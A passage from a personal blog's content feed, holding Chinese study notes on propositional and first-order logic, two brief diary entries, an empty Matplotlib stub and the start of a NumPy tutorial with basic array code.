id="第3章-命题逻辑的推理理论"><a href="#第3章-命题逻辑的推理理论" class="headerlink" title="第3章 命题逻辑的推理理论"></a>第3章 命题逻辑的推理理论</h3><h4 id="3-1-推理的形式结构"><a href="#3-1-推理的形式结构" class="headerlink" title="3.1 推理的形式结构"></a>3.1 推理的形式结构</h4><p>数理逻辑的主要任务是用数学的方法研究推理，所谓推理是指从前提除法推出结论的思维过程，而前提是已知的命题公式集合，结论是从前提出发应用推理规则推出的命题公式</p><blockquote><p>定义3.1 设$A_1,A_2,\cdots,A_k$和$B$，若对于$A_1,A_2,\cdots,A_k$和$B$中出现的命题变项的任意一组赋值，或者$A_1\land A_2\land \cdots\land A_k$为假，或者当$A_1\land A_2\land \cdots\land A_k$为真时$B$也为真，则称由前提$A_1,A_2,\cdots,A_k$推出结论$B$的推理是<strong>有效的</strong>或<strong>正确的</strong>，并称$B$为<strong>有效的结论</strong>. $B$不一定是正确的.<br>由推理$\Gamma $推出$B$的推理记为$\Gamma \vdash B$. 若推理是正确的，则记为$\Gamma \vDash B$否则记$\Gamma \nvDash B$为推理形式结构.</p><p>定理3.1 命题公式$A_1,A_2,\cdots,A_k$推出$B$的推理正确当且仅当$A_1\land A_2\land \cdots \land A_k\to B$为重言式.<br>判断是否为重言式的方法 1. 真值表法 2. 等值演算法 3. 主析取范式法</p></blockquote><p>有一些重要的重言蕴含式，称作<strong>推理定律</strong>.</p><ol><li>附加律 $A\Rightarrow (A\lor B)$ </li><li>化简律 $(A\land B)\Rightarrow A$</li><li>假言推理 $(A\to B)\land A \Rightarrow B$</li><li>拒取式 $(A\to B)\land \neg B\Rightarrow \neg A$</li><li>析取三段论 $(A\lor B)\land \neg B\Rightarrow A$</li><li>假言三段论 $(A\to B)\land (B\to C)\Rightarrow (A\to C)$</li><li>等价三段论 $(A\leftrightarrow B)\land (B\leftrightarrow C)\Rightarrow (A\leftrightarrow C)$</li><li>构造性二难 $(A\to B)\land (C\to D)\land (A\lor C)\Rightarrow (B\lor D), (A\to B)\land (\neg A \to B)\Rightarrow B$</li><li>破坏性二难 $(A\to B)\land (C\to D)\land (\neg B\lor \neg D)\Rightarrow (\neg A\lor \neg C)$</li></ol><h4 id="3-2-自然推理系统-P"><a href="#3-2-自然推理系统-P" class="headerlink" title="3.2 自然推理系统$P$"></a>3.2 自然推理系统$P$</h4><blockquote><p>定义3.2 一个形式系统$I$由下面4个部分组成.<br>(1) 非空的字母表$A(I)$.<br>(2) $A(I)$中符号构成的合式公式集$E(I)$.<br>(3) $E(I)$中一些特殊的公式组成的公理集$A_X(I)$.<br>(4) 推理规则集$R(I)$.<br>将$I$记为4元组$<a(i),e(i),a_x(i),r(i)>$. 其中$<a(i),e(i)>$是$I$的<strong>形式语言系统</strong>，而$<a_x(i),r(i)>$为$I$的<strong>形式演算系统</strong>.</a_x(i),r(i)></a(i),e(i)></a(i),e(i),a_x(i),r(i)></p></blockquote><p>形式系统一般分为两类. 一类是<strong>自然推理系统</strong>，他的特点是从任意给定的前提出发，应用系统中的推理规则进行推理演算，最后得到的命题公式是推理的结论。另一类是<strong>公理推理系统</strong>，它只能从若干条给定的公理出发，应用系统中的推理规则进行推理演算，得到的结论是系统中的重言式，称为系统中的定理。</p><blockquote><p>定义3.3 自然推理系统$P$定义如下.</p><ol><li>字母表<br>(1) 命题变项符号: $p,q,r,\cdots, p_i,q_i,r_i,\cdots(i\geqslant 1)$.<br>(2) 联结词符号: $\neg ,\land ,\lor ,\to ,\leftrightarrow$.<br>(3) 括号与逗号: $(,),,.$</li><li>合式公式 同定义1.6</li><li>推理规则<br>(1) 前提引入规则: 在证明的任何步骤都可以引入前提<br>(2) 结论引入规则: 在证明的任何步骤所得到的结论都可以作为后继证明的前提<br>(3) 置换规则: 在证明的任何步骤，命题公式中的子公式都可以用等值的公式置换，得到公式序列的又一个公式<br>由9条推理定律和结论引入规则可以导出以下各条推理规则<br>(4) 假言推理规则(或分离规则): 若证明的公式序列中已出现过$A\to B$和$A$，则由假言推理定律$(A\to B)\land A \Rightarrow B$可知，$B$是$A\to B$和$A$的有效结论. 图示<script type="math/tex; mode=display">\begin{matrix} A\to B\\ A\\ \hline \therefore B \end{matrix}</script>(5) 附加规则:<script type="math/tex; mode=display">\begin{matrix} A\\\hline \therefore A\lor B \end{matrix}</script>(6) 化简规则<script type="math/tex; mode=display">\begin{matrix} A\land B\\\hline \therefore A \end{matrix}</script>(7) 拒取式规则<script type="math/tex; mode=display">\begin{matrix} A\to B\\ \neg B\\\hline \therefore \neg A \end{matrix}</script>(8) 假言三段论规则<script type="math/tex; mode=display">\begin{matrix} A\to B\\ B\to C\\ \hline \therefore A\to C \end{matrix}</script></li></ol></blockquote><p>…就是符号表示一下，不打了，一共到12</p><p>设前提$A_1,A_2,\cdots,A_k,$结论$B$和公式序列$C_1,C_2,\cdots,C_l$. 如果每一个$i(i=1,2,\cdots ,l)$,$C_i$是某个$A_j$或者可由序列中前面的公式应用推理规则得到，并且$C_l=B$，则称公式序列$C_1,C_2,\cdots,C_l$是由$A_1,A_2,\cdots,A_k$推出$B$的<strong>证明</strong>.</p><p>附加前提证明法： 推理形式结构 $(A_1\land A_2\land \cdots \land A_k)\to (A\to B)$，可以改写成$(A_1\land A_2\land \cdots \land A_k\land A)\to B$.<br>拆开可得到两式等值，若能证明后式为重言式则前式为重言式，称作<strong>附加前提证明法</strong>，$A$称作<strong>附加前提</strong></p><p>将结论的否定式作为前提引入并推出矛盾式的证明方法称作<strong>归谬法</strong></p><h4 id="3-3-消解证明法"><a href="#3-3-消解证明法" class="headerlink" title="3.3 消解证明法"></a>3.3 消解证明法</h4><p>消解证明法是根据归谬法的思想吗，采用消解规则构造证明的方法，它的基本做法是把前提中的公式和结论的否定都化成等值的合取范式，以这些合取范式中的所有简单析取式作为前提，用消解规则构造证明。如果能得到空式，则证明推理是正确的</p><h3 id="第4章-一阶逻辑基本概念"><a href="#第4章-一阶逻辑基本概念" class="headerlink" title="第4章 一阶逻辑基本概念"></a>第4章 一阶逻辑基本概念</h3><p><strong>量词</strong>用来表达出个体与总体之间的内在联系和数量关系，这就是<strong>一阶逻辑</strong>所研究的内容<br>一阶逻辑也称作一阶谓词逻辑或谓词逻辑</p><h4 id="4-1-一阶逻辑命题符号化"><a href="#4-1-一阶逻辑命题符号化" class="headerlink" title="4.1 一阶逻辑命题符号化"></a>4.1 一阶逻辑命题符号化</h4><p><strong>个体词</strong>是指所研究对象中可以独立存在的具体的或抽象的客体<br>将表示具体或特定的客体个体词称作<strong>个体常项</strong>，一般用小写英文字母$a,b,c$表示<br>将表示抽象或泛指的个体词称作<strong>个体变项</strong>，常用$x,y,z$表示，并称个体变项的取值范围为<strong>个体域(或论域)</strong><br>个体域可以是有穷集合也可以是无穷集合<br>有一个特殊的个体域，它是由宇宙间一切事物组成的，称作<strong>全总个体域</strong></p><p><strong>谓词</strong>是用来刻画个体词性质及个体词之间相互关系的词，常用$F,G,H$表示<br>表示具体性质或关系的谓词称作<strong>谓词常项</strong>，表示抽象或泛指的性质或关系的谓词称作<strong>谓词变项</strong></p><p>一般地，含$n(n\geqslant 1)$个个体变项$x_1,x_2,\cdots, x_n$的谓词$P$称作$n$元谓词，记作$P(x_1,x_2,\cdots,x_n)$<br>$n$元谓词是以个体域为定义域，以$\{0,1\}$为值域的$n$元函数或关系<br>将不带个体变项的谓词称作$0$元谓词</p><p>表示个体常项或变项之间数量关系的词称作<strong>量词</strong><br>“一切的”，“所有的”，“每一个”，“任意的”，“凡”，“都”等词统称作<strong>全称量词</strong>，用符号$\forall $表示<br>“存在”，“有一个”，“有的”，“至少有一个”等词统称作<strong>存在量词</strong>，用符号$\exists $表示</p><p>特性谓词的作用是将个体变元局限止在满足该谓词代表的性质或关系的范围之内<br>若个体域为全总个体域，对个体变项的范围用医院特性谓词描述<br>特性谓词的使用规则<br>(1) 对于全称量词$\forall x$，其特性谓词作为蕴含式的前件加入<br>(2) 对于存在量词$\exists x$，其特性谓词作为合取式的合取项加入</p><p>当$F$是谓词常项时，$\forall xF(x)$是一个命题. 如果把个体域中的任何一个个体$a$代入，$F(a)$都为真，则$\forall xF(x)$为真；否则$\forall xF(x)$为假. $\exists xF(x)$也是一个命题. 如果个体域中存在一个个体$a$，使得$F(a)$为真，则$\exists xF(x)$为真；否则$\exists xF(x)$为假.</p><h4 id="4-2-一阶逻辑公式及其解释"><a href="#4-2-一阶逻辑公式及其解释" class="headerlink" title="4.2 一阶逻辑公式及其解释"></a>4.2 一阶逻辑公式及其解释</h4><p>一阶语言是用于一阶逻辑的形式语言，一阶逻辑是建立在一阶语言上的逻辑体系.</p><p>个体常项符号、函数符号和谓词符号称作<strong>非逻辑符号</strong>，个体变项符号、量词符号、联结词符号和括号与逗号称作<strong>逻辑符号</strong></p><blockquote><p>定义4.2 $L$的项定义如下.<br>(1) 个体常项符号和个体变项符号是项<br>(2) 若$\varphi (x_1,x_2,\cdots,x_n)$是$n$元函数符号，$t_1,t_2,\cdots,t_n$是$n$个项，则$\varphi (t_1,t_2,\cdots,t_n)$是项<br>(3) 所有的项都是有限次使用(1),(2)得到的<br>定义4.3 设$R(x_1,x_2,\cdots,x_n)$是$L$的$n(n\geqslant 1)$元谓词符号，$t_1,t_2,\cdots,t_n$是$L$的$n$个项，称$R(t_1,t_2,\cdots,t_n)$是<strong>原子公式</strong><br>定义4.4 <strong>合式公式</strong>的定义如下<br>(1) 原子公式是合式公式<br>(2) 若$A$是合式公式，则$(\neg A)$也是合式公式<br>(3) 若$A,B$是合式公式，则$(A\land B),(A\lor B),(A\to B),(A\leftrightarrow B)$也是合式公式<br>(4) 若$A$是合式公式，则$\forall xA,\exists xA$也是合式公式<br>(5) 只有有限次的应用(1)-(4)构成的符号串才是合式公式<br>$L$的合式公式也称作<strong>谓词公式</strong>，简称为<strong>公式</strong><br>定义4.5 在公式$\forall xA$和$\exists xA$中，称$x$为<strong>指导变元</strong>，$A$为量词的<strong>辖域</strong>. $\forall x$和$\exists x$的辖域中，$x$的所有出现都称作<strong>约束出现</strong>，$A$中不是约束出现的其他变项均称作<strong>自由出现</strong><br>定义4.6 设$A$是任意的公式，若$A$中不含自由出现的个体变项，则称$A$为<strong>封闭的公式</strong>，简称作<strong>闭式</strong>. </p></blockquote><p>个体域及个体常项符号、函数符号、谓词符号的指定称作<strong>解释</strong>，指定自由出现的个体变项的值称作<strong>赋值</strong></p><blockquote><p>定义4.7 设$L$是由$L$生成的一阶语言，$L$的解释$I$由下面4部分组成<br>(a) 非空个体域$D_I$.<br>(b) 对每一个个体常项符号$a\in L$，有一个$\bar {a}\in D_I$，称$\bar {a}$为$a$在$I$中的解释.<br>(c) 对每一个$n$元函数符号$f\in L$，有一个$D_I$上的$n$元函数$\bar {f}:D^n_I\to D_I$，称$\bar {f}$为$f$在$I$中的解释.<br>(d) 对每一个$n$元谓词符号$F\in L$，有一个$D_I$上的$n$元谓词常项$\bar {F}$，称$\bar {F}$为$F$在$I$中的解释.<br>$I$下的赋值$\sigma$：对每一个个体变项符号$x$指定$D_I$中的一个值$\sigma (x)$.<br>设公式$A$，规定：在解释$I$和解释$\sigma$下</p><ol><li>取个体域$D_I$</li><li>若$A$中含个体常项符号$a$就将它替换成$\bar {a}$.</li><li>若$A$中含函数符号$f$就将它替换成$\bar {f}$.</li><li>若$A$中含谓词符号$F$就将它替换成$\bar {F}$</li><li>若$A$中含自由出现的个体变项符号$x$就将它替换成$\sigma (x)$<br>把这样所得到的公式记作$A’$. 称$A’$为$A$在$I$和$\sigma$下的解释，或$A$在$I$和$\sigma$下被解释成$A’$<br>定义4.8 设$A$为一公式，若$A$在任何解释和该解释下的任何赋值下均为真，则称$A$为<strong>永真式</strong>(或称作<strong>逻辑有效式</strong>). 若$A$在任何解释和该解释下的任何赋值均为假，则称$A$为<strong>矛盾式</strong>(或<strong>永假式</strong>). 若$A$在任何解释和该解释下的一个赋值使$A$为真，则称$A$是<strong>可满足式</strong><br>定义4.9 设$A_0$是含命题变项$p_1,p_2,\cdots,p_n$的命题公式，$A_1,A_2,\cdots,A_n$是$n$个谓词公式，用$A_i(1\leqslant i\leqslant n)$处处代替$A_0$中的$p_i$，所得的公式$A$称为$A_0$的<strong>代换实例</strong>.<br>定理4.1 重言式的代换实例都是永真式，矛盾式的代换实例都是矛盾式</li></ol></blockquote><h3 id="第5章-一阶逻辑等值演算和推理"><a href="#第5章-一阶逻辑等值演算和推理" class="headerlink" title="第5章 一阶逻辑等值演算和推理"></a>第5章 一阶逻辑等值演算和推理</h3><h4 id="5-1-一阶逻辑等值式与置换规则"><a href="#5-1-一阶逻辑等值式与置换规则" class="headerlink" title="5.1 一阶逻辑等值式与置换规则"></a>5.1 一阶逻辑等值式与置换规则</h4><blockquote><p>定义5.1 设$A,B$是一阶逻辑中任意两个公式，若$A\leftrightarrow B$是永真式，则称$A$与$B$等值，记作$A\Leftrightarrow B$. 称$A\Leftrightarrow B$是<strong>等值式</strong>.</p></blockquote><ol><li>量词否定等值式<br>(1) $\neg \forall xA(x)\Leftrightarrow \exists x\neg A(x)$<br>(2) $\neg \exists xA(x)\Leftrightarrow \forall x\neg A(x)$</li><li>量词辖域收缩与扩张等值式<br>(1) $\forall x(A(x)\lor B) \Leftrightarrow \forall xA(x)\lor B$.<br> $\forall x(A(x)\land B)\Leftrightarrow \forall xA(x)\land B$.<br> $\forall x(A(x)\to B)\Leftrightarrow \exists xA(x)\to B$.<br> $\forall x(B\to A(x))\Leftrightarrow B\to \forall xA(x)$.<br>(2) $\exists x(A(x)\lor B)\Leftrightarrow \exists xA(x)\lor B$.<br> $\exists x(A(x)\land B)\Leftrightarrow \exists xA(x)\land B$.<br> $\exists x(A(x)\to B)\Leftrightarrow \forall xA(x)\to B$.<br> $\exists (B\to A(x))\Leftrightarrow B\to \exists xA(x)$.</li><li>量词分配等值式<br>(1) $\forall x(A(x)\land B(x))\Leftrightarrow \forall xA(x)\land \forall xB(x)$.<br>(2) $\exists x(A(x)\lor B(x))\Leftrightarrow \exists xA(x)\lor \exists xB(x)$.</li></ol><p>规则</p><ol><li>置换规则 设$\Phi (A)$是含公式$A$的公式，$\Phi (B)$是用公式$B$取代$\Phi (A)$中所有的$A$之后所得到的公式. 那么，若$A\Leftrightarrow B$，则$\Phi (A)\Leftrightarrow \Phi (B)$.</li><li>换名规则 设$A$为一公式，将$A$中某量词辖域中的一个约束变项的所有出现及相应的指导变元全部改成该量词辖域中未曾出现过的某个个体变项符号，公式中其余部分不变，将所得公式记作$A’$，则$A’\Leftrightarrow A$.</li></ol><h4 id="5-2-一阶逻辑前束范式"><a href="#5-2-一阶逻辑前束范式" class="headerlink" title="5.2 一阶逻辑前束范式"></a>5.2 一阶逻辑前束范式</h4><blockquote><p>定义5.2 具有如下形式$Q_1x_1Q_2x_2\cdots Q_kx_kB$的一阶逻辑公式称作<strong>前束范式</strong>，其中$Q_i(1\leqslant i\leqslant k)$为$\forall $或$\exists $，$B$为不含量词的公式.<br>定理5.1(前束范式存在定理) 一阶逻辑中的任何公式都存在等值的前束范式.</p></blockquote><h4 id="5-3-一阶逻辑的推理理论"><a href="#5-3-一阶逻辑的推理理论" class="headerlink" title="5.3 一阶逻辑的推理理论"></a>5.3 一阶逻辑的推理理论</h4><p>在一阶逻辑中，从前提$A_1,A_2,\cdots,A_k$出发推出结论$B$的推理的形式结构，依然采用如下的蕴含式形式$A_1\land A_2\land \cdots \land A_k\to B$. 若为永真式，则称推理正确，否则称推理不正确.<br>在一阶逻辑中称永真式的蕴含式为推理定律. 若一个推理的形式结构是推理定律，则这个推理是正确的.</p><p>后面关于自然推理系统的定义就不写了</p><h2 id="第2部分"><a href="#第2部分" class="headerlink" title="第2部分"></a>第2部分</h2><h2 id="第5部分"><a href="#第5部分" class="headerlink" title="第5部分"></a>第5部分</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>《离散数学（第2版）》，屈婉玲、耿素云、张立昂，高等教育出版社</li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> discrete-mathematics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190808</title>
      <link href="/blog/20190808/"/>
      <url>/blog/20190808/</url>
      
        <content type="html"><![CDATA[<p>明天就要去韩国van了嗷，大噶勿念，虽然也没什么人看我这小破blog..</p><p>所有的流量基本全是buuctf的你敢信…当时闲着没事做了一下buuctf的misc和编码部分…居然会有这么多流量…<br><img src="/img/bqb/lengzhu.jpg" alt></p><p>今天搜论文，忽然看到了<a href="http://www.mit.edu/~amarj/files/2048.pdf" target="_blank" rel="noopener">Deep Reinforcement Learning for 2048</a>，当时AlphaGo还是雏形的时候我就想着用Machine Learning玩2048，可惜可惜~<br><a href="https://www.cnblogs.com/beiyuoi/p/6052090.html" target="_blank" rel="noopener">naive ai(<del>其实就是AStar</del>)~</a></p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190730</title>
      <link href="/blog/20190730/"/>
      <url>/blog/20190730/</url>
      
        <content type="html"><![CDATA[<p>今天下午看视频的时候，突然接到一个北京的电话，还以为是快递的，结果是CSDN的电话…<br>问我为什么不用他们博客了…我就说了什么主题太少不好看，个性化不够，限制太多之类的..<br>感觉很神奇…</p><p>还有最近的觉是真的多…吹空调开被子睡觉好爽x</p><p>啊…今天想出去多走点路，就走去拿快递了，然后去之前就感觉在阿水会遇到熟人，然后去阿水买了杯毒药果然遇到了熟人233<br>前任和她的现任…他们今天一周年233<br>拿快递又遇到一个熟人..happy<br>好久没看见放风筝的了，想放。</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Matplotlib笔记</title>
      <link href="/blog/note-matplotlib/"/>
      <url>/blog/note-matplotlib/</url>
      
        <content type="html"><![CDATA[<p>翻出陈旧的笔记，终于要开始写了呢。<br>——20200229</p><p>可能最后还是咕咕了？<br>——20200302</p><hr><p>正文</p>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> note </tag>
            
            <tag> matplotlib </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NumPy笔记</title>
      <link href="/blog/note-numpy/"/>
      <url>/blog/note-numpy/</url>
      
        <content type="html"><![CDATA[<h2 id="NumPy"><a href="#NumPy" class="headerlink" title="NumPy"></a>NumPy</h2><p>numpy = Numerical + Python</p><p>安装啥的我就不写了，因为我装的anaconda，这些东西直接都装好了<br>全文默认<code>import numpy as np</code></p><p>查看版本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">print(np.__version__)</span><br></pre></td></tr></table></figure></p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>numpy围绕ndarrays展开</p><h3 id="数组的创建"><a href="#数组的创建" class="headerlink" title="数组的创建"></a>数组的创建</h3><h4 id="创建一维数组"><a href="#创建一维数组" class="headerlink" title="创建一维数组"></a>创建一维数组</h4><p>创建方法就是将序列传递给NumPy的array()函数; 你可以传递任何序列（类数组）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a = np.array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line">b = np.array((<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>))</span><br><span class="line">c = np.arange(<span class="number">5</span>)</span><br><span class="line">d = np.linspace(<span class="number">0</span>, <span class="number">2</span>*np.pi, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">print(a) <span class="comment"># &gt;&gt;&gt;[0 1 2 3 4]</span></span><br><span class="line">print(b) <span class="comment"># &gt;&gt;&gt;[0 1 2 3 4]</span></span><br><span class="line">print(c) <span class="comment"># &gt;&gt;&gt;[0 1 2 3 4]</span></span><br><span class="line">print(d) <span class="comment"># &gt;&gt;&gt;[ 0.          1.57079633  3.14159265  4.71238898  6.28318531]</span></span><br><span class="line">print(a[<span class="number">3</span>]) <span class="comment"># &gt;&gt;&gt;3</span></span><br></pre></td></tr></table></figure></p><p>另外</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">np.zeros((<span class="number">2</span>, <span class="number">3</span>)) <span class="comment"># 函数创建一个填充了0的数组 array([[ 0., 0., 0.], [ 0., 0., 0.]])</span></span><br><span class="line">np.ones((<span class="number">3</span>,<span class="number">4</span>)) <span class="comment"># 函数创建一个填充了1的数组</span></span><br><span class="line">np.empty_like(x)   <span class="comment"># Create an empty matrix with the same shape as x</span></span><br><span class="line">np.empty((<span class="number">2</span>,<span class="number">3</span>)) <span class="comment"># empty函数创建一个数组。它的初始内容是随机的，取决于内存的状态</span></span><br><span class="line">np.full((<span class="number">2</span>,<span class="number">2</span>), <span class="number">3</span>) <span class="comment"># full函数创建一个填充给定值的n * n数组</span></span><br><span class="line">np.eye(<span class="number">3</span>,<span class="number">3</span>) <span class="comment"># eye函数可以创建一个n * n矩阵，对角线为1，其他为0</span></span><br><span class="line">np.linspace(<span class="number">0</span>, <span class="number">10</span>, num=<span class="number">4</span>) <span class="comment"># 函数linspace在指定的时间间隔内返回均匀间隔的数字。 例如，下面的函数返回0到10之间的四个等间距数字</span></span><br><span class="line">np.random.random((<span class="number">2</span>,<span class="number">2</span>)) <span class="comment"># 要创建一个填充0到1之间随机值的数组</span></span><br></pre></td></tr></table></figure><h4 id="创建多维数组"><a href="#创建多维数组" class="headerlink" title="创建多维数组"></a>创建多维数组</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = np.array([[<span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>],</span><br><span class="line">              [<span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>],</span><br><span class="line">              [<span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>],</span><br><span class="line">              [<span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span> ,<span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">              [<span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>]])</span><br><span class="line"></span><br><span class="line">print(a[<span class="number">2</span>,<span class="number">4</span>]) <span class="comment"># &gt;&gt;&gt;25</span></span><br></pre></td></tr></table></figure><h4 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h4><p>逗号的用法应该是和Python一样的，用逗号分隔维度<br>如果不加冒号：单独取出一列会降维<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(a[<span class="number">0</span>, <span class="number">1</span>:<span class="number">4</span>]) <span class="comment"># &gt;&gt;&gt;[12 13 14]</span></span><br><span class="line">print(a[<span class="number">1</span>:<span class="number">4</span>, <span class="number">0</span>]) <span class="comment"># &gt;&gt;&gt;[16 21 26]</span></span><br><span class="line">print(a[::<span class="number">2</span>,::<span class="number">2</span>]) <span class="comment"># &gt;&gt;&gt;[[11 13 15]</span></span><br><span class="line">                  <span class="comment">#     [21 23 25]</span></span><br><span class="line">                  <span class="comment">#     [31 33 35]]</span></span><br><span class="line">print(a[:, <span class="number">1</span>]) <span class="comment"># &gt;&gt;&gt;[12 17 22 27 32]</span></span><br></pre></td></tr></table></figure></p><h4 id="数组信息"><a href="#数组信息" class="headerlink" title="数组信息"></a>数组信息</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print(type(a)) <span class="comment"># &gt;&gt;&gt;&lt;class 'numpy.ndarray'&gt;</span></span><br><span class="line">print(a.dtype) <span class="comment"># &gt;&gt;&gt;int64</span></span><br><span class="line">print(a.size) <span class="comment"># &gt;&gt;&gt;25</span></span><br><span class="line">print(a.shape) <span class="comment"># &gt;&gt;&gt;(5, 5)</span></span><br><span class="line">print(a.itemsize) <span class="comment"># &gt;&gt;&gt;8 每个项占用的字节数</span></span><br><span class="line">print(a.ndim) <span class="comment"># &gt;&gt;&gt;2 数组的维数</span></span><br><span class="line">print(a.nbytes) <span class="comment"># &gt;&gt;&gt;200 数组中的所有数据消耗掉的字节数</span></span><br></pre></td></tr></table></figure><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>注意除了最后一个以外，其他都是对对应元素的操作，也就是<code>*</code>不代表矩阵乘法，只是对应元素相乘，<code>a.dot(b)</code>是求内积或点积（一个意思吧）<br>其实<code>a.dot(b)=sum(a*b)</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a = np.arange(<span class="number">25</span>)</span><br><span class="line">a = a.reshape((<span class="number">5</span>, <span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">b = np.array([<span class="number">10</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">56</span>, <span class="number">79</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">45</span>,</span><br><span class="line">              <span class="number">4</span>, <span class="number">92</span>, <span class="number">5</span>, <span class="number">55</span>, <span class="number">63</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">6</span>, <span class="number">53</span>, <span class="number">24</span>,</span><br><span class="line">              <span class="number">56</span>, <span class="number">3</span>, <span class="number">56</span>, <span class="number">44</span>, <span class="number">78</span>])</span><br><span class="line">b = b.reshape((<span class="number">5</span>,<span class="number">-1</span>)) <span class="comment"># Setting to -1 automatically decides the number of cols</span></span><br><span class="line"></span><br><span class="line">print(a + b)</span><br><span class="line">print(a - b)</span><br><span class="line">print(a * b)</span><br><span class="line">print(a / b)</span><br><span class="line">print(a ** <span class="number">2</span>)</span><br><span class="line">print(a &lt; b) print(a &gt; b)</span><br><span class="line"></span><br><span class="line">print(a.dot(b))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">x = np.array([[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>]], dtype=np.float64)</span><br><span class="line">y = np.array([[<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>,<span class="number">8</span>]], dtype=np.float64)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Elementwise sum; both produce the array</span></span><br><span class="line"><span class="comment"># [[ 6.0  8.0]</span></span><br><span class="line"><span class="comment">#  [10.0 12.0]]</span></span><br><span class="line">print(x + y)</span><br><span class="line">print(np.add(x, y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Elementwise difference; both produce the array</span></span><br><span class="line"><span class="comment"># [[-4.0 -4.0]</span></span><br><span class="line"><span class="comment">#  [-4.0 -4.0]]</span></span><br><span class="line">print(x - y)</span><br><span class="line">print(np.subtract(x, y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Elementwise product; both produce the array</span></span><br><span class="line"><span class="comment"># [[ 5.0 12.0]</span></span><br><span class="line"><span 